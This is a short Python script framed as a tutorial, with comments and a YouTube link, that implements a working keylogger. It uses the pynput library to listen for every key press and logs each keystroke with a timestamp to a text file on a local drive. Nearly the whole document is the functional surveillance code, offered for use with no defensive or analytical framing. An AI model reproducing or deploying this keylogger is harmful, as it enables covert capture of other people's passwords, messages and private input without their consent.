#youtube video tutorial (full) :

#https://youtu.be/zjvOeQKsjyU




# first install pynput with the command pip install pynput , others are inbuilt

# import the requires modules
import logging
from pynput.keyboard import Key,Listener



#   If no file is present in the specified path namd output.txt , we will have to create the file .. otherwise we might get an error
# IF the file is already created , then don't do anything ...

# to create the file, uncomment the following 2 lines

#filecreate=open("G:\output.txt","w")
#filecreate.close()


# now specify where to save the logs and in what format
logging.basicConfig(filename=("G:\output.txt"), level=logging.DEBUG, format=" %(asctime)s - %(message)s") # replace with the path of your output file

# make a function which stores the info in the txt file
def on_press(key):
    logging.info(str(key))

# set the keyboard to always wait for some key to be pressed
with Listener(on_press=on_press) as listener:
    listener.join()